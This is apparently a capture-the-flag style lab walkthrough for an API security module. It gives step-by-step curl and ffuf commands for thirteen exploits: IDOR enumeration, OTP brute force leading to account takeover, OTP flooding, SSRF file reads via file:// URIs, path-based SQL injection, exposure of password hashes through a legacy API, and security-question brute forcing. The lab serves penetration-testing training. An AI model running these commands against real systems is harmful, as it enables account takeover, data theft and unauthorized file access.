# API Attacks

## 1. Information Disclosure – Server Header Identification

**Question**
Interact with any endpoint and inspect the response headers. Identify the server name used by the API.

**Steps**

1. Visit the Swagger UI:

   ```
   http://<TARGET_IP>:<PORT>/swagger
   ```
2. Open **Developer Tools (F12)** → **Network** tab.
3. Trigger any API request from Swagger.
4. Inspect **Response Headers**.

**Finding**

* The `Server` header reveals the backend server name.

---

## 2. Broken Object Level Authorization (BOLA) – Supplier Reports

**Goal**
Access quarterly reports belonging to other suppliers by manipulating object IDs.

### Step 1: Authenticate as Supplier

```bash
# Authenticate with valid supplier credentials
curl -X POST http://<TARGET_IP>/api/v1/authentication/suppliers/sign-in \
  -H 'Content-Type: application/json' \
  -d '{"Email":"<SUPPLIER_EMAIL>","Password":"<PASSWORD>"}'
```

* Copy the returned **JWT** (redacted).

### Step 2: Check Current User Roles

```bash
# Verify roles assigned to the authenticated supplier
curl -X GET http://<TARGET_IP>/api/v1/roles/current-user \
  -H 'Authorization: Bearer <JWT>'
```

* Confirms access to quarterly report endpoints.

### Step 3: Enumerate Quarterly Reports (IDOR)

```bash
# Loop through report IDs to access unauthorized reports
for i in {1..50}; do
  curl -s -X GET http://<TARGET_IP>/api/v1/suppliers/quarterly-reports/$i \
    -H 'Authorization: Bearer <JWT>' | grep "HTB"
done
```

**Impact**

* Reports belonging to other suppliers are accessible.

---

## 3. Broken Authentication – OTP Brute Force (Customer Account Takeover)

**Goal**
Reset the password of a victim customer by brute‑forcing a 4‑digit OTP.

### Step 1: Trigger OTP Generation

```bash
# Request password reset OTP for the target customer
curl -X POST http://<TARGET_IP>/api/v1/authentication/customers/passwords/resets/email-otps \
  -H 'Content-Type: application/json' \
  -d '{"Email":"MasonJenkins@ymail.com"}'
```

### Step 2: Brute Force OTP Using ffuf

```bash
# Brute force all 4-digit OTP values (0000–9999)
ffuf -X POST http://<TARGET_IP>/api/v1/authentication/customers/passwords/resets \
  -H 'Content-Type: application/json' \
  -d '{"Email":"MasonJenkins@ymail.com","OTP":"FUZZ","NewPassword":"password"}' \
  -w <(seq -w 0000 9999) \
  -fs 23 -t 50
```

* `-w` generates zero‑padded OTPs
* `-fs 23` filters failed responses

### Step 3: Reset Password with Valid OTP

```bash
# Use the discovered OTP to reset the password
curl -X POST http://<TARGET_IP>/api/v1/authentication/customers/passwords/resets \
  -H 'Content-Type: application/json' \
  -d '{"Email":"MasonJenkins@ymail.com","OTP":"<VALID_OTP>","NewPassword":"password"}'
```

### Step 4: Authenticate and Extract Payment Data

```bash
# Authenticate and retrieve sensitive payment information
curl -X GET http://<TARGET_IP>/api/v1/customers/payment-options/current-user \
  -H 'Authorization: Bearer <JWT>'
```

---

## 4. Excessive Data Exposure – Supplier Companies

### Step 1: Authenticate

```bash
# Login with supplier credentials
curl -X POST http://<TARGET_IP>/api/v1/authentication/suppliers/sign-in \
  -H 'Content-Type: application/json' \
  -d '{"Email":"htbpentester5@hackthebox.com","Password":"<PASSWORD>"}'
```

### Step 2: Retrieve Excessive Data

```bash
# Endpoint exposes more data than required
curl -X GET http://<TARGET_IP>/api/v1/supplier-companies \
  -H 'Authorization: Bearer <JWT>'
```

---

## 5. Unrestricted Resource Consumption – OTP Flooding

**Goal**
Trigger excessive OTP generation without rate limiting.

```bash
# Repeated OTP requests without restriction
for i in {1..20}; do
  curl -X POST http://<TARGET_IP>/api/v1/authentication/customers/passwords/resets/sms-otps \
    -H 'Content-Type: application/json' \
    -d '{"Email":"htbpentester4@hackthebox.com"}'
done
```

* API returns a flag in the response body.

---

## 6. Broken Function Level Authorization – Billing Addresses

```bash
# Access billing addresses without proper authorization
curl -X GET http://<TARGET_IP>/api/v1/customers/billing-addresses \
  -H 'Authorization: Bearer <JWT>' | grep "HTB"
```

---

## 7. Unrestricted Access to Sensitive Business Flow

**Goal**
Extract address of a user by ID.

```bash
# Retrieve all billing addresses and filter by user ID
curl -X GET http://<TARGET_IP>/api/v1/customers/billing-addresses \
  -H 'Authorization: Bearer <JWT>' | grep "<USER_UUID>"
```

---

## 8. Server-Side Request Forgery (SSRF) – Local File Read

### Step 1: Create Product with File URI

```bash
# Inject local file path into image URI
curl -X POST http://<TARGET_IP>/api/v1/products/current-user \
  -H 'Authorization: Bearer <JWT>' \
  -d '{"NewProduct":{"Name":"Test","Price":6,"PNGPhotoFileURI":"file:///etc/flag.conf"}}'
```

### Step 2: Retrieve Product Image

```bash
# Download base64-encoded file contents
curl -X GET http://<TARGET_IP>/api/v1/products/<PRODUCT_ID>/photo
```

* Decode Base64 to obtain flag.

---

## 9. Security Misconfiguration – SQL Injection via Path

```bash
# Exploit unsafe path parameter handling
curl -H "Origin: http://<TARGET_IP>/" \
  http://<TARGET_IP>/api/v1/suppliers/'%20OR%201==1%20--/count
```

* Returns total record count.

---

## 10. Improper Inventory Management – Deleted Records

```bash
# Access deprecated API version exposing deleted data
curl -X GET http://<TARGET_IP>/api/v0/supplier-companies/deleted | grep "Email"
```

---

## 11. Legacy API Trust Issue – Password Hash Exposure

```bash
# Retrieve deleted suppliers including password hashes
curl -X GET http://<TARGET_IP>/api/v0/suppliers/deleted | grep "Yara MacDonald"
```

---

## 12. Security Question Brute Force

```bash
# Brute force security question answers using color wordlist
ffuf -X POST http://<TARGET_IP>/api/v2/authentication/suppliers/passwords/resets/security-question-answers \
  -H 'Content-Type: application/json' \
  -d '{"SupplierEmail":"EMAIL","SecurityQuestionAnswer":"COLOR","NewPassword":"password"}' \
  -w colors.txt:COLOR -w emails.txt:EMAIL -fs 23
```

---

## 13. Arbitrary File Read via CV Upload

```bash
# Update supplier profile with local file reference
curl -X PATCH http://<TARGET_IP>/api/v2/suppliers/current-user \
  -H 'Authorization: Bearer <JWT>' \
  -d '{"ProfessionalCVPDFFileURI":"file:///flag.txt"}'
```

```bash
# Retrieve and decode the uploaded CV
curl -X GET http://<TARGET_IP>/api/v2/suppliers/current-user/cv
```

---
